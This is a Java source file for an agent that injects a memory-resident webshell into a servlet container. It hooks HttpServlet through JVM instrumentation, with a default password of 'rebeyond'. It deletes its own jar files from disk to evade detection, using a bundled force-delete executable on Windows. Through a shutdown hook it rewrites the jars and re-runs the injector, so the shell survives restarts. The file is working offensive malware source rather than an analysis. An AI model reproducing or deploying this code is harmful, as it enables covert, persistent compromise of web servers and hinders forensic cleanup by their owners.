package cn.com.x1001;

/**
 * @author x1001 
 * 2020/11/17
 *
 */
import java.io.*;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Arrays;

public class Agent {
    //打印输出
    public static PrintStream out = System.out;
    public static String KEY_CLASS = "javax/servlet/http/HttpServlet";
    public static String currentPath ;
    public static String password = "rebeyond";
    public static byte[] injectFileBytes = new byte[]{}, agentFileBytes = new byte[]{};


    public static void agentmain(String args, Instrumentation inst) throws IOException {
        if (args.contains("^")) {
            Agent.currentPath = args.split("\\^")[0];
            Agent.password = args.split("\\^")[1];
        } else {
            Agent.currentPath = args;
        }
        out.println("Agent password:"+Agent.password);
        out.println("Agent currentPath:"+Agent.currentPath);
        start(inst);
    }

    private static void start(Instrumentation inst) {
        out.println("********************************************************************");
        out.println("*                      shell inject success                        *");
        out.println("********************************************************************");
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            //
        }
        inst.addTransformer(new ShellTransformer(), true);

        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class clazz : loadedClasses) {
            String name = clazz.getName().replace(".", "/");
            if (name.equalsIgnoreCase(KEY_CLASS)) {
                try {
                    // hook已经加载的类，或者是回滚已经加载的类
                    inst.retransformClasses(clazz);
                } catch (Throwable t) {
                    //
                }
            }

        }
        try {
            readInjectFile(Agent.currentPath);
            readAgentFile(Agent.currentPath);
            clear(Agent.currentPath);
            persist();
        } catch (Exception e) {
            System.out.println(e);
        }

    }
    public static void writeFiles(String fileName, byte[] data) throws Exception {
        String tempFolder = System.getProperty("java.io.tmpdir");
        System.out.println("写入文件路径："+tempFolder);
        FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
        fso.write(data);
        fso.close();
    }
    public static void persist() {
        try {
            out.println("persist add");
            Thread t = new Thread() {
                public void run() {
                    try {
                        out.println("persist start");
                        writeFiles("inject-1.0.jar", Agent.injectFileBytes);
                        writeFiles("shell-agent.jar", Agent.agentFileBytes);
                        out.println("persist end");
                        startInject();
                    } catch (Exception e) {

                    }
                }
            };
            t.setName("shutdown Thread");
            Runtime.getRuntime().addShutdownHook(t);
        } catch (Throwable t) {
            out.println(t.getMessage());
        }
    }

    private static void startInject() throws InterruptedException, IOException {
        Thread.sleep(2000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + "inject-1.0.jar " + Agent.password;
        Runtime.getRuntime().exec(cmd);
    }

    static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            totalLength += byteArray[i].length;
        }

        byte[] result = new byte[totalLength];
        int cur = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
        }

        return result;
    }

    public static void readInjectFile(String filePath) throws Exception {
        String fileName = "inject-1.0.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void readAgentFile(String filePath) throws Exception {
        String fileName = "shell-agent.jar";
        File f = new File(filePath + File.separator + fileName);
        System.out.println(f.getAbsolutePath());
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {
            String currentPath = Agent.currentPath;

            public void run() {
                try {
                    Thread.sleep(5000);
                    String injectFile = currentPath + "inject-1.0.jar";
                    String agentFile = currentPath + "shell-agent.jar";
                    new File(injectFile).getCanonicalFile().delete();
                    String OS = System.getProperty("os.name").toLowerCase();
                    out.println("file delete success!!!");
                    if (OS.contains("windows")) {
                        try {
                            unlockFile(currentPath);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    new File(agentFile).delete();
                } catch (Exception e) {
                    out.println(e);
                }
            }
        };
        clearThread.start();

    }

    public static void unlockFile(String currentPath) throws Exception {
        String exePath = currentPath + "foreceDelete.exe";
        InputStream is = Agent.class.getClassLoader().getResourceAsStream("other/forcedelete.exe");
        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            fos.write(bytes, 0, num);
            fos.flush();
        }
        fos.close();
        is.close();
        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        new File(exePath).delete();
    }
    public static String getCurrentPid() {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        return runtimeMXBean.getName().split("@")[0];
    }
}
